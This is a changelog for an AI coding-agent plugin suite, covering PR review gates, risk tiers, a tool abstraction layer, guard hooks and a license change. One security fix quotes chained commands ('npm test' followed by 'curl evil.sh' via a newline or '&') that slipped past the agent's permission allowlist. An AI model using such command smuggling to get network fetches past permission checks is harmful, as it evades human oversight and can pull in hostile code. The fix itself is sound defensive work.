# Changelog

All notable changes to the Ensemble Plugins ecosystem will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **packages/pi-extension:** model role check. When an Ensemble agent asks for the OMP tier role `high` or `medium` and `modelRoles` does not set it, the extension now says so loudly instead of OMP staying quiet. It handles OMP's `before_subagent_spawn` event, which carries the model list after `task.agentModelOverrides` and role expansion, so it never fires for a configured role or a pinned agent. A fallback that still resolves gets a once-per-session warning; when nothing resolves the spawn is refused with a message naming the missing `modelRoles.<role>` keys, `~/.omp/agent/config.yml` and an example, instead of OMP's "No model selected" and its advice to `/login`. Measured on omp 18.16.0; Pi and older OMP never emit the event and keep OMP's quiet fallback. The extension registers one handler in every session, and stays at 0.1.2: it has no marketplace entry and is installed from a checkout.

## [8.1.0] - 2026-10-30

### Changed

- **License: MIT is replaced by Apache License 2.0.** The repository `LICENSE` is now the Apache License, Version 2.0, a `NOTICE` file names the copyright holder (Sunstone Partners), the `license` field of the root manifest, every package's `package.json` and `.claude-plugin/plugin.json` (and the matching `package-lock.json` workspace entries) is `Apache-2.0`, and the README, CONTRIBUTING and package READMEs say so. Releases already published, up to 8.0.0, remain available under the MIT License they were released under. This is the only content change in this release; the packages whose content changed take a patch bump (see Release plumbing).

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 8.0.0 → 8.1.0. This is a MINOR release: the
  only change since 8.0.0 is the relicense (see Changed); no package, command,
  agent or skill is added or removed.
- Every package that
  `node scripts/validate-release-bump.js origin/main` lists as content-changed
  takes a PATCH bump, because only its manifest `license` field and its README
  license text changed:
  `ensemble-ai` 7.0.0 → 7.0.1, `ensemble-blazor` 7.0.0 → 7.0.1,
  `ensemble-codex` 6.0.1 → 6.0.2, `ensemble-core` 6.1.0 → 6.1.1,
  `ensemble-development` 7.0.1 → 7.0.2, `ensemble-dotnet` 2.0.0 → 2.0.1,
  `ensemble-e2e-testing` 6.1.0 → 6.1.1, `ensemble-exunit` 5.1.1 → 5.1.2,
  `ensemble-git` 6.1.0 → 6.1.1, `ensemble-infrastructure` 6.1.0 → 6.1.1,
  `ensemble-jest` 5.1.2 → 5.1.3, `ensemble-nestjs` 6.0.0 → 6.0.1,
  `ensemble-opencode` 5.4.0 → 5.4.1, `ensemble-permitter` 5.2.2 → 5.2.3,
  `ensemble-phoenix` 6.0.0 → 6.0.1, `ensemble-pi` 1.6.18 → 1.6.19,
  `ensemble-product` 7.0.0 → 7.0.1, `ensemble-pytest` 5.2.0 → 5.2.1,
  `ensemble-quality` 6.0.1 → 6.0.2, `ensemble-rails` 6.0.0 → 6.0.1,
  `ensemble-react` 7.0.0 → 7.0.1, `ensemble-rspec` 5.2.0 → 5.2.1 and
  `ensemble-xunit` 5.2.0 → 5.2.1. No `@sunstone-partners/ensemble-*`
  dependency or peer range moved; every one is still satisfied.
- `ensemble-pi` is bumped by hand this time: `scripts/bump-pi-version-if-changed.js`
  watches only `packages/pi/{prompts,agents,skills,AGENTS.md}`, which did not
  change, so `generate:pi` wrote nothing while the release gate flagged the
  changed `packages/pi/README.md`.
- `ensemble-opencode`'s `ENSEMBLE_META.version` (returned by the
  `ensemble-info` tool) is 5.4.1 to match its manifest.
- Unchanged: `ensemble-assessment` 2.0.0, `ensemble-guards` 5.2.1,
  `ensemble-telemetry` 5.2.1, `ensemble-lifecycle` 7.0.0 and
  `ensemble-reqnroll` 1.0.2 (their only change is the manifest `license`
  field, which the release gate does not count as content), plus
  `ensemble-agent-core` and `ensemble-pi-extension` 0.1.2 (no marketplace
  entry; installed from a checkout).

## [8.0.0] - 2026-10-30

### Added

- **`flake-reproduction` skill (`ensemble-quality`):** an editable recipe and replayable red-run record for intermittent test failures (PRD-2026-bd69b524, REQ-034 and REQ-035). No automatic retry, quarantine, skip, wider timeout or weaker assertion. `deep-debugger` now loads it for flaky failures. Edit the defaults in the skill's `SKILL.md`; no rebuild is needed.
- **`pr-review-request` skill (`ensemble-development`):** say "review open PRs", "review PR #N" or "review local changes" and the request is routed to `pr-review-cycle` with the right inputs, instead of only being reachable through `/ensemble:pr-merge`, `fix-issue` or `implement-trd-beads`. A PR review reads and reviews only: nothing is pushed, commented or approved on the PR (it is review-only, below). Local changes are the user's own work, so the cycle's batch fix is applied to the working tree and nothing is committed.
- **Review-only PR reviews, with CI as the tests (`ensemble-development`):** a review of someone else's PR (the `pr-review-request` router, or any caller passing `REVIEW_ONLY`) now runs the independent review, verification and report and stops: no batch fix, no post-fix verification, no re-review. Its status is `REVIEW_PENDING` with a reason, never `REVIEW_COMPLETE`, and its local phase is never `LOCAL_REVIEW_COMPLETE`; `pr-review-cli.js status` enforces this through the new `reviewOnly` fact, so no other fact can complete it. A green CI result for the exact head now stands in for the local test run: the router reads the commit's check runs read-only and the CLI derives the tests fact from them (`tests: { source: 'ci', checkRuns, totalCount }`, new `lib/pr-review-ci-tests.js`). Only a check run for that commit that concluded `success` counts; a run for another commit is ignored, and a failed, unfinished or unreadable run, an empty list or a list shorter than the host's own total leaves the tests unshown, so they run locally once. A typed "CI passed" is refused. Local changes are unaffected: not review-only, and the tests still run locally.
- **packages/development, packages/git:** risk tiers, commit-bound human
  approvals and the merge gate (TRD-2026-70e784f2, PR 4).
  `lib/pr-review-tier.js` derives the tier from the change itself (never from
  who wrote it), floors it on sensitive and High paths, and is **raise-only**:
  anyone may propose a higher tier, but a proposal that lowers one is ignored
  and recorded as `lowering-needs-code-owner` unless a code owner of the
  affected path makes it. `lib/pr-review-approvals.js` counts an approval only
  when it is bound to the commit (or tree) under review, so a push invalidates
  it; bot approvals never count, the author never fills a required slot, and
  the person named on an agent-authored PR's `Directed by:` line counts as one
  of the required reviewers. `lib/pr-review-gate.js` answers "may this PR
  merge?" with `mergeable` plus a blocker list that always carries a
  `nextAction`, refusing on an open Important finding, an unanswered security
  finding, an incomplete description or review data it could not read — it
  never passes on missing data. Reached as the `tier`, `approvals` and `gate`
  subcommands of `lib/pr-review-cli.js`, and through `MODE=gate` of the
  `pr-review-cycle` skill, which `pr-merge` now requires `mergeable:true` from
  on freshly read GitHub state.
  **Strict by default:** the Low tier is treated as Medium unless
  `lowWaiverEnabled` is turned on with its evidence, so no PR silently drops
  to zero human reviewers.
  **Honest limit:** these gates run where ensemble runs. Server-side
  enforcement of required approvals needs a branch-protection rule in the host
  repository; `pr-merge` reports when it is absent and recommends it, but
  cannot enforce it. See the README section "Risk tiers, human approvals and
  the merge gate".

- **packages/development:** review metrics and the reviewer eval set
  (TRD-2026-70e784f2, PR 5). `lib/pr-review-metrics.js` computes per-cohort
  human approvals per PR (median and p95), human comments, wait-on-human
  hours, rounds-to-pass, the share of PRs needing five or more rounds and the
  noise rate, counting no bot reviewer, and compares a post-change cohort with
  the committed baseline: targets are graded relative to baseline and a
  revert/incident guardrail fails the cohort on its own.
  `lib/pr-review-eval.js` scores an incident-driven, code-owner-confirmed eval
  case set, compares runs and reports regressions and stale cases. Both are
  reached as JSON-in/JSON-out subcommands of `lib/pr-review-cli.js`
  (`metrics`, `metrics-compare`, `eval-score`, `eval-compare`, `eval-stale`)
  and through the new `pr-review-eval` skill, which walks a maintainer through
  adding a case (`docs/review-eval/cases/<id>.json`) and running the eval set
  when the reviewer's rules, prompts or model change. No dashboard, no
  scheduler, no new dependency: recurrence is the host repository's
  responsibility (Constitution Rule 4).
  **Entry criterion:** a comparison is only meaningful against a baseline
  captured *before* the review changes land — capture the baseline cohort once
  (at least 20 PRs **and** at least 30 days) and commit it as
  `docs/guides/review-baseline-<date>.json`; never edit a baseline in place. A
  cohort missing either floor is returned as `insufficient` with no target
  graded. Runbook: `docs/guides/pr-review-metrics.md` (extends §6 of
  `docs/guides/pr-review-cycle-time-pilot.md`).
  `ensemble-full` mirrors the new libraries and the new skill, and
  `ensemble-pi` vendors them with the generated `pr-review-eval` skill copy.

- **packages/development, packages/core, packages/git:** on-demand sweeps,
  explainers and the cross-runtime reachability proof that completes the code
  review process (TRD-2026-70e784f2, PR 6). `pr-review-sweep` reviews code
  that is **already merged**, sensitive areas first, with the same bounds and
  the same strict-majority verification a PR gets; every finding is tagged
  `Pre-existing`, so a sweep can never block somebody else's merge, and it
  reports without editing, committing, pushing or opening a PR. Recurrence
  stays the host repository's (Constitution Rule 4): the skill holds no timer
  and ensemble's own workflows gain no `schedule:` trigger.
  `pr-review-explainer` describes a module from the code as it is now and
  names every file it read; a High-tier PR's report offers one for each
  touched sensitive module, and generates it only on request.
  `lib/pr-review-reachability.js` proves every capability is reached from the
  REAL entry points -- entry command text to skill to a registered subcommand
  -- rather than merely unit-tested, and grades the four runtimes against a
  baseline.
  **Runtime coverage, stated rather than implied:** Claude Code and Pi are
  equivalent (the same payloads produce byte-identical output from each
  runtime's own shipped CLI); **Codex and OpenCode are reduced** -- both
  generate the command entry points, but neither bundles the `pr-review-*`
  procedure skills or a vendored CLI, so the graded steps do not run there.
  See `docs/reports/pr-review-cross-runtime-reachability.md`.
  The in-agent review needs **no new CI secret** and makes no network call.
  The whole process is now documented for users in section 11 of
  `docs/guides/user-guide.md`.
- **Tool abstraction layer (PRD/TRD 2026-8d825f54):** commands, agents and skills call versioned category capabilities (for example `tracker.show`, `host.change-request-create`, `workflow.push`) instead of naming tool binaries; adapters (`adapter-*` skills with an `adapter.yaml` manifest) implement them for each of the 14 categories. Resolution, preflight, allowlisted no-shell execution and `toolchain-cli validate` live in `packages/development/lib/toolchain/`. `scripts/lint-provider-refs.js` fails CI on a hardcoded tool binary in a shared source, with a baseline ratchet for grandfathered violations and zero tolerance for the named refactored sources.
- **Tool abstraction layer, delivered in 11 PRs (#191-#201):** contract and config foundation (#191), adapter manifest, discovery and validation (#192), runner (#193), detection and confirmation (#194), runtime delivery (#195; the toolchain CLI and the adapter skills are vendored into the Pi and Codex outputs), tracker contract and default adapter (#196), work-graph fallback and tracker command refactors (#197), alternative trackers (#198), host and workflow (#199), long-tail categories (#200), and lint, equivalence and documentation (#201). Adapter skills by package: `ensemble-development` (beads tracker and work graph, default test runner, reviewdog lint), `ensemble-git` (GitHub host, git-town and plain-git workflow, plain-git worktree, local CI through `act`), `ensemble-infrastructure` (Jira Cloud and Azure Boards trackers, Azure DevOps host, Docker and kubectl container deploy, Terraform IaC, AWS platform cloud), `ensemble-e2e-testing` (Playwright e2e quality), `ensemble-core` (npm package runner) and `ensemble-quality` (CodeRabbit review).
- **Documentation:** generated per-category contract specs in `docs/toolchain/contracts/` (regenerate with `node scripts/generate-contract-docs.js`, verify with `--check`), the [adapter authoring guide](docs/guides/adapter-authoring.md) and the [toolchain migration guide](docs/guides/toolchain-migration.md), which gives a fix for every lint failure class.
- **Local CI gate (`ensemble-development`, `ensemble-git`; PRD/TRD 2026-4dec59b8; #184, #189, #190):** `npm run ci:local` reproduces CI on a clean clone of the committed HEAD (no `node_modules`, no `dist`): it runs `npm ci --legacy-peer-deps` and then `scripts-tests`, `validate`, `generate-validate`, `generated-drift` and `test` with `CI=true`, prints a result table and exits non-zero on failure; it never touches the working tree. The new `local-ci-gate` skill runs the repository's required checks against a clean clone of the exact PR head on Node 22 and 24, posts an `ensemble/local-ci` commit status with the maintainer's own `gh` login, and `/ensemble:pr-merge` now decides on that gate verdict instead of waiting for hosted CI and bot reviews: bot reviews never block a merge, a human `CHANGES_REQUESTED` review does, and a PR branch that is behind its base is refused, not skipped. **Honest limits:** there is no GitHub App, so the required check is unpinned and any identity with write access can post a status under that name. The gate stops accidents and agents merging unverified work; it does not stop deliberate forgery. Shipping it changes no branch protection: until a repository admin follows the rollout runbook (`packages/development/skills/local-ci-gate/RUNBOOK.md`) and requires `ensemble/local-ci`, GitHub still enforces the hosted checks the branch requires, and `pr-merge` never bypasses a required check.
- **Three new plugins (instruction-content audit, #181 and #182):**
  - `ensemble-telemetry` (`packages/telemetry`): local, opt-in usage telemetry. Off by default (`ENSEMBLE_TELEMETRY=1` or a `.ensemble/telemetry/enabled` file); one `{ts, session_id, kind, name}` line per command, skill or agent use in `.ensemble/telemetry/usage.jsonl`, never prompt text, tool input or output, tokens or paths, and nothing leaves the machine. `ensemble-stats` ranks usage and, with `--inventory`, lists the components that were never used. It replaces the removed `ensemble-metrics`.
  - `ensemble-guards` (`packages/guards`): enforcement hooks for rules that prompts can only request, configured in `.ensemble/guards.json`. `protected-branch` blocks `git commit` and `git push` on main, master and production (also after a `git checkout` or `switch` earlier in the same command) and force pushes to them, and blocks a push whose target it cannot resolve; `bypass-flags` blocks `--no-verify` and `--no-gpg-sign`; `br-close-reason` blocks `br close` without a non-empty `--reason`; `dod` (opt-in) blocks Stop and SubagentStop while your command fails. `ENSEMBLE_GUARDS=0` disables every guard and an internal error fails open. It is a standalone plugin, not bundled into `ensemble-full`. Not implemented: a test-first guard. It had not run in a live session when it was merged.
  - `ensemble-lifecycle` (`packages/lifecycle-claude`): runs the `command.start` and `command.end` hooks from `.ensemble/hooks.yaml` in Claude Code (through `UserPromptSubmit`, `Stop`, `StopFailure` and `SessionEnd`), from a committed bundle of the unchanged agent-core lifecycle code and with the same trust store as Pi (`node <plugin>/bundle/lifecycle.cjs trust`, from a terminal). Shell handlers only; prompt handlers stay Pi-only. `Stop` means the turn ended, not that the command finished, and an interrupt ends the run `cancelled` at the next command or `SessionEnd`. It had not run in a live Claude Code session when it was merged.
- **`/ensemble:onboard`, `/ensemble:retro` and four new skills (#181):** `onboard` (`ensemble-development`) onboards you onto an existing codebase: architecture overview, the exact build, test and lint commands, hotspots and an optional debt backlog. `retro` (`ensemble-development`, with `lib/estimate-actual.js`) is a post-release retrospective: estimate accuracy, PRD success-metric status, incidents and proposed follow-ups. New skills: `threat-model` (adds a `## Threat Model` section to a TRD that touches authentication, PII, payments, file upload, external exposure or a new third-party integration) and `incident-triage` (production incidents and postmortems) in `ensemble-quality`, `safe-migration` (schema, API contract and major-dependency changes) in `ensemble-development`, and `a11y-perf-checks` (accessibility and performance budgets for critical journeys) in `ensemble-e2e-testing`. `pr-review-cycle` gains an optional prose-only security gate (`/security-review`, `gitleaks`, `osv-scanner`) that never changes the CLI status.
- **Beads link back to the PRD and TRD (`ensemble-development`, #187):** every bead `/ensemble:implement-trd-beads` scaffolds (epic, story, implementation or test task, synthesized test) now opens with a `## References` block -- TRD, TRD task, PRD, one `PRD Requirement:` per REQ, PRD acceptance criteria, the verified task for tests and the parent epic -- and carries an `externalRef` passed to `br create --external-ref`. This replaces the old `TRD Reference:` and `PRD Reference:` lines, which existed only on task beads, used raw paths and named only the first REQ. Executors must read those links before any work: the new `trd-cli bead-context --bead <id> [--trd <path>]` re-reads the referenced TRD task and PRD requirements live and returns `ok:false` with `missing[]` (exit 1) when anything cannot be resolved; `beads-build-wave` tracks carry a `context_contract`, and a bead whose read fails is commented `blocked:missing-references`, reopened and not implemented. Legacy open beads are not backfilled.
- **Prompt budget, eval harness and CI checks (#181, #186):** a prompt word-budget lint with a ratchet baseline now runs in `npm run validate`; `evals/` is a headless eval harness (stub-tested only: no real-model baseline has been captured) with `docs/guides/prompt-testing.md`; a validator in `validate` and `generate:validate` flags command step keys that the generators do not render (`RENDERED_STEP_KEYS`). CI gains Dependabot, CodeQL, a gitleaks secret scan (pinned CLI, no organization licence secret), a generated-output drift check and an advisory PR size check (`scripts/pr-size.js` counts hand-written against generated lines, warns over the threshold and always exits 0, so it is never a required check).

### Changed

- **Review speed-up, prose half (`pr-review-cycle`, `pr-review-request`; PR 1 of 2):** the review keeps every guarantee -- base-commit guidance, independent verification, `REVIEW_COMPLETE` computed only by the CLI, reduced reviews reported as reduced, never touching the PR -- and stops spending time where it bought none.
  - **Tier before depth.** A local review recorded no tier, so `depth` fell back to `deep` for every PR whatever it changed. The cycle now runs `tier` over the Step 1b path classification before `depth`, with no classifier (that is a `MODE=gate` step): an ordinary change is Medium and gets **Standard**, a change touching a sensitive or High path is High and stays **Deep**, a tier the CLI cannot read is still Deep, and Low is never reached without a classifier (it is Standard until the Low waiver is in force). No tier is ever typed; the report and the state report carry the tier and depth the review ran at.
  - **The reviewer brief is normative.** Reviewers read the diff and a frozen snapshot; they run no test suite and no mutation experiment, make at most one throwaway snippet, and stop at a tool-call cap with the findings so far and the paths they did not reach (which are reported as not reviewed, never as reviewed). The checks that a finding really holds move to the verifiers: the narrowest test, or one mutation in their own throwaway copy, on the one finding they are asked about.
  - **A verifier that returns nothing no longer stalls the round.** It is recorded in `incompleteVerifiers` on every finding it was assigned and the cycle moves on: no wait, no re-dispatch. Those findings come back `unverified` (as the votes contract already says) and the report says in plain words that the review is partially verified.
  - **Cost gate and parallel PRs (`pr-review-request`).** Before a review starts the router shows each PR's tier, depth, reviewer and verifier counts and a time bound (the cycle's own budget; a ceiling, not a forecast), via the new `PLAN_ONLY` input, and asks when a PR resolves to Deep or more than three PRs are listed. Several PRs are then reviewed together: reviewers and verifiers run at the same time, test runs stay one at a time.
  - **An unchanged head costs nothing to ask about again.** With the new `REUSE_RECORDED` input (set only by the router) the cycle's Step 1a returns the recorded result for the same head and base instead of redoing the review; blocked results and results for another base are reviewed again. Every other caller is unchanged.

- **Review dedupe, reviewer agents and more reviewers on request (`pr-review-cycle`, `pr-review-request`):** the review keeps every guarantee -- nothing dropped before verification, `REVIEW_COMPLETE` computed only by the CLI, reduced reviews reported as reduced, the PR never touched.
  - **`ledger dedupe` merges findings that are very probably one defect.** Independent reviewers rarely cite a defect with the same line range or the same words (`delegation-contract.js:293-302` against `:294-302`), so the verbatim location-and-failure-mode key merged nothing (14 in, 14 out) on two real runs and the orchestrator merged by hand. `dedupeFindings` (the CLI's `ledger dedupe`) now also merges findings from **different reviewers** that cite the same file with overlapping lines, or lines within two of each other, and whose descriptions (failure mode and evidence) are of comparable length and agree once the words most of the round's findings share are discounted; a round of two findings merges nothing. Anything not clearly the same defect stays separate: two defects on one line (a non-ASCII path rejected and a backslash-quote escape, both at `evidence-capture.js:31`) are two findings, one reviewer's own findings are never merged with each other, and a finding with an open thread, an `uncertain` flag, another class, another security relevance or another Pre-existing status is never merged this way. Every original link, the fix id, the most-severe-actionable collapse and "an actionable entry never keeps `deferred`" are unchanged, and an entry merged this way lists its members in the new `mergedFrom`. Checked on the real candidates: PR 205's 14 became 11 (the three pairs merged by hand) and PR 207's 40, from four reviewers, became 29, with every candidate accounted for. `recordRound` is untouched: a repeat across rounds is still the exact path, failure mode and class.
  - **The skill says what kind of agent a reviewer or verifier must be.** In a measured run an agent specialised in code review returned in 25 seconds with one finding and ignored the output schema the brief asked for, where a general agent given the same brief followed it and found more (in about 7 minutes). Reviewers and verifiers must now follow the output contract their brief asks for, be able to read files and run read-only commands, and not impose a findings schema or cap their own depth. With no such agent the runtime's general-purpose one runs, and the report (and `reducedReview` in the state report) says in plain words that the assurance is reduced. It names a requirement, never an agent or a product, so it holds on every runtime.
  - **More reviewers on request (`REVIEWER_COUNT`, opt-in).** Standard and Deep already accept more reviewers than the minimum, so no CLI behaviour or bound changed. `REVIEWER_COUNT` (2 to 4) sets the reviewers Step 1c plans; `depth` grades that plan like any other, so `violations` stays binding (Quick keeps its one reviewer, a policy minimum above the count raises it), the verifier count is unchanged, and anything but an integer from 2 to 4 is refused as `REVIEW_BLOCKED` before any reviewer runs. `pr-review-request` passes nothing by default and passes the count only when the person asked for more reviewers ("review thoroughly", "use more reviewers", a number); that request redoes the review rather than returning a recorded one, and the plan and the cost-gate table show the count.

- **Instruction-content audit (#181):** commands, agents, skills, hooks and tooling were audited against what current models and native Claude Code already do, then trimmed or rewritten: `implement-trd-beads` 15.2k -> about 3.2k words (plus an on-demand `implement-trd-beads-reference` skill), the `git-town` skill 58k -> about 2k words, framework and platform skills reduced to conventions only, `create-trd`, `refine-trd`, `new-feature`, `fix-issue`, `pr-merge`, `code-reviewer`, `deep-debugger` and `tech-lead-orchestrator` trimmed, and `CLAUDE.md` 1.7k -> 177 words (it imports `@AGENTS.md`) and `AGENTS.md` 1.6k -> 726. The rewrites are covered by validation, the test suite and contract tests; **none has been measured against model behavior.**
- **packages/ai, blazor, dotnet, nestjs, phoenix, rails, react (breaking for direct `lib/index.js` consumers):** the framework and platform skills were reduced to conventions only, so their `REFERENCE.md`, `VALIDATION.md` and `README.md` side files and their `templates/` and `examples/` files are gone, and each package's `lib/index.js` now exposes only where the skills are. `ai` exports `{ name, skillsDir, skills, skillPath(name) }` (it exported `name`, `version`, `metadata`, `loadSkill`, `getTemplate`, `getExample` and `detectOpenAI`); `blazor`, `nestjs`, `phoenix`, `rails` and `react` export `{ name, skillsDir, skillPath }` (between them they lose the `skill` or `metadata` object, `loadSkill`, `getTemplate`, `getExample`, the detection helpers `isDotNetAvailable`, `isElixirAvailable`, `isRailsAvailable` and `detectReact`, and, for `nestjs`, `getMetadata`, `getTemplateNames`, `getExampleNames`, `isCompatibleWithAgent` and `getDetectionPatterns`); `dotnet` keeps `plugin` and `loadSkill()` (no argument) and drops `getTemplate` and `getExample`. Nothing in this repository calls the removed functions; external users of the `@sunstone-partners/ensemble-*` npm packages could. All seven are therefore MAJOR bumps: `ensemble-ai`, `ensemble-blazor` and `ensemble-react` 7.0.0, `ensemble-nestjs`, `ensemble-phoenix` and `ensemble-rails` 6.0.0, `ensemble-dotnet` 2.0.0.
- **packages/assessment (#182):** the eight `assess-team-*` skills are merged into one `assess-team-dimension` skill (23 -> 16 skills; see Removed). `commit-volume` and `incidents` are dropped (incidents had no data source) along with the per-developer rankings table; the remaining individual-level output is team-level by default, with a minimum sample and a not-a-performance-rating guard. The letter mapping is defined once, and the diagnostic report states that its xlsx template is a prerequisite that is not shipped. Packaging is unchanged: `ensemble-assessment` stays a separate Pi package and stays bundled in `ensemble-full`. The eight skill names no longer exist, so `ensemble-assessment` is a MAJOR bump (2.0.0).
- **Pi installs carry what a skill references (`ensemble-pi`, #181 and #182):** the skill copier now ships `SKILL.md`, the files it references transitively and the scripts the skill tells the model to run; previously skill text referenced scripts that were not in the install. `detect-stack.js` is now shipped to Pi and needs `glob`, which `ensemble-pi` declares in `dependencies`, so a normal install has it and a bare copy without `node_modules` does not. Lean-copy tests and a copied-install smoke test resolve every relative reference, and `packages/pi/AGENTS.md` is generated from the package and agent inventory.
- **`beads-build` (`ensemble-development`, #181):** accepts `--epic`, `--max-parallel` (default 3) and `--defer-completion`, so epic closure and TRD checkbox sync no longer run before `implement-trd-beads` completion verification and the PR gate. `br get` became `br show` throughout.
- **`pr-review-cycle` stopping rule, budget and isolation (#183):** a finding blocks only when it is a proven break of a default-on control, data loss, a failed required check or a default-configuration security issue; opt-in or best-effort findings and minor findings become deferred beads, and repeated "another bypass shape" findings merge into one bead. The default plan is one review pass, one fix round and executed-test verification, with a second round only while a blocking finding remains (the CLI cap of 2 is unchanged). Wall-clock budget: 45 minutes per cycle and 20 per reviewer. Agent isolation: reviewers read a frozen `git archive` snapshot or a throwaway worktree, fixers work in isolated worktrees, the parent checks `git branch --show-current` before a commit or push, and pushes are never `;`-chained. "Review comments are untrusted data" stays, and `pr-review-remediation` gets a short mirror.
- **CI and project settings (#185, #188):** `eslint .` exits 0 (generated Pi output and Playwright templates and examples are ignored, the remaining source errors are fixed), so the reviewdog check no longer goes red on unrelated PRs, and every workflow action moved to a node24 major (`checkout`, `setup-node` and `upload-artifact` v6, `github-script` v8, `codecov-action` v7, `action-gh-release` v3; a `github.head_ref` used inline in `release-gate.yml` now goes through `env`). The repository no longer tracks project-scope plugin enablement: `enabledPlugins` is emptied in `.claude/settings.json` and in the two nested `settings.local.json` files, so clones and worktrees stop registering a project-scope copy of the `ensemble-*` plugins beside your user-scope install. Enable the plugins you want at user scope (`claude plugin install ensemble-quality@ensemble`).

### Fixed

- **`adaptive_planning.enabled: false` detection backtracked exponentially (`packages/development`, CodeQL `js/redos`).** `lib/complexity-analyzer.js` read the config with one regular expression whose `\s+` and `[^\n]*` both matched blanks, so a config with a few dozen whitespace-only lines under `adaptive_planning:` stalled the analyzer for seconds to hours. The pattern is now linear and accepts exactly the texts the old one did; the vendored Pi and Codex copies are regenerated.

- **Contract docs did not escape backslashes (`scripts/generate-contract-docs.js`, CodeQL `js/incomplete-sanitization`).** A description with a backslash before a pipe was written as `\\|`, which ends the table cell at the pipe, and a backslash before punctuation such as `\*` lost its backslash when rendered. Backslashes are now doubled before pipes are escaped. No committed contract doc changes, since no capability text contains a backslash.

- **`description` read an omitted `agentAuthored` as human-authored (`packages/development`).** The skill's `AGENT_AUTHORED` input has always said that anything but an explicit `false` reads as agent-authored, so a claim nobody made never relaxes the accountability check, but `lib/pr-review-description.js` (and so the `description` CLI subcommand, which only delegates to it) answered `agentAuthored:false` when the key was left out. An omitted, null or unreadable claim now reads as agent-authored and a body with no `Directed by:` line is reported with `directed-by` missing. Callers that know a person wrote the body pass an explicit `false`; `pr-review-request` cannot know and passes nothing.

- **packages/development, packages/pi:** a credential shown to a reviewer
  could be reproduced in a PR comment or ledger entry. `pr-review-cli.js`
  redacted only before a state report touched **disk**, so a token in a
  finding's text survived into the CLI's stdout -- the text that actually
  becomes a comment or a ledger entry -- through `ledger` and `votes`.
  Redaction now happens at the single output boundary, error path included.
  The vendored Pi copy had drifted and was still printing the credential
  after the fix landed in `packages/development`, so the same review was
  clean on Claude and leaking on Pi; it has been re-vendored, and a scenario
  now compares a credential-carrying payload across both runtimes so the
  drift cannot return unnoticed.

- **packages/development, packages/quality, packages/git (final review):**
  the merge gate no longer passes on a missing ledger -- `pr-review-cycle`
  Step 10 and `pr-merge` treat a head with no recorded review as unavailable
  (`review-data-unavailable`), never as an empty ledger. The sweep skill now
  records `Pre-existing` findings through `recordRound` with a valid
  disposition and documents the `paths` declaration as
  `{ sourceSha, sensitive, high }`; Step 4 uses the Important/Nit/Pre-existing
  vocabulary; the explainer `TIER` is lowercase like the CLI; and the
  `code-reviewer` output contract lists `disposition`.

- **packages/development, packages/codex (local review gate, PRs 2-6):** the
  merge gate now answers `review-data-unavailable` when it is not given a head
  SHA and refuses an approvals result that names no commit; the eval run
  (`pr-review-eval` Step R3.1) passes CODEOWNERS to `eval-score` so a case no
  owner confirmed earns no credit; `pr-review-cycle` Step 10e says review and
  head trees are computed by the run, never read from review text; and the
  generated Codex `code-reviewer` agent is `sandbox_mode = "read-only"` like
  its source declares.

- **`ensemble-permitter` allowlist bypass (security, #181):** newline, a single `&` and `|&` are now command separators, so every chained command must match the allowlist; previously `npm test\ncurl evil.sh` and `npm test & curl evil` were auto-allowed under `Bash(npm test:*)`. Redirections to or from a path (`>`, `>>`, `<`, `&>`, `&>>`) and unquoted subshell or grouping parentheses now fall through to the normal permission dialog (fd merging such as `2>&1` and redirects to exactly `/dev/null` stay allowed). **Behavior change:** a chained or redirected command that used to be allowed silently now prompts.
- **Generators silently dropped step `instructions` (#181):** a command step's `instructions` was never rendered (only `fix-issue` used it, so about 2.8k words never reached the model). The new `RENDERED_STEP_KEYS` constant and the validator in `validate` and `generate:validate` now flag any step key the generators do not render; `fix-issue` moved what it needs into rendered fields (the rendered command grows from about 1.2k to 2.4k words because it now actually ships its gates), and the unrendered `skill` and `timing` keys in `release.yaml` were fixed.
- **Smoke checks that always passed (`ensemble-e2e-testing`, #181):** the smoke-test scripts hardcoded `passed = true`; they now run real, config-driven checks and report `NOT CONFIGURED` instead of passing, and the release gate follows the runner verdict. They also never echo subprocess output into reports (a secret split across stdout and stderr is masked as one text), kill the whole process group on timeout so a child cannot hold the runner past its limit, and return structured results for a malformed config.
- **`trd-parser` kept only the first REQ of a `[satisfies]` bracket (`ensemble-development`, #175):** `[satisfies REQ-001, REQ-002]` yielded only `REQ-001`, so traceability under-reported silently and the requirements gate and `implement-trd-beads` saw fewer covered REQs than the TRD named. Every id in the bracket is now read, collected without duplicates and in document order.
- **Skill frontmatter (#181):** 19 skills that had no frontmatter now have it.
- **Test-only fixes:** the lifecycle bundle freshness test compares a fresh build only under the bun that built the bundle (`bundle/BUN_VERSION`) and skips otherwise, because bun's output differs between versions (#209); the `pr-review-metrics` baseline-reproduction test is bounded to the baseline's cohort cutoff, so it no longer fails as merged PRs accumulate (#212).

### Documentation

- **User guide section 11, "Code review process":** the whole process in one
  chapter -- `REVIEW.md` and the `ensemble-review-policy` block, depth and
  verification thresholds, risk tiers, commit-bound approvals and the merge
  gate, metrics and the reviewer eval set, sweeps and explainers, and which
  runtimes the capability is reduced on. Each stated gate was checked against
  the shipped modules by running them, not against the changelog.
- **Wiki:** a `Code-Review-Process` page is staged at
  `.wiki-staging/Code-Review-Process.md` per AGENTS.md (local-only, excluded
  from git) and is published with `scripts/wiki-publish.sh --yes`. It is
  generated from user guide section 11, which stays the source of truth.
- **Contributing and PR flow (#186):** `CONTRIBUTING.md` documents the PR flow -- about 400 hand-written lines per PR, new components in their own PR, small stacked PRs merged as they land, a same-day rebase when the base moves, a definition of done (required checks plus the review stopping rule), `npm run ci:local` before pushing, and a consumer check (sibling repositories such as Foreman, and the Pi, Codex and OpenCode outputs) before removing or renaming anything -- plus `docs/guides/stacked-prs.md` and a PR template checklist.
- **PRDs and TRDs:** `PRD-2026-bd69b524` (delivery-flow improvements, Draft v1.0.0, #203) and PRD/TRD 2026-4dec59b8 (local CI PR approval) with the gate's `RUNBOOK.md`, `PROOF.md`, `MEASUREMENT.md` and `BASELINE.md` under `packages/development/skills/local-ci-gate/`.
- **`AGENTS.md`:** a standing rule never to create worktrees, clones or scratch files under `/tmp`; use siblings of the main checkout and `~/.omp/<task-dir>/` instead (#216).

### Removed

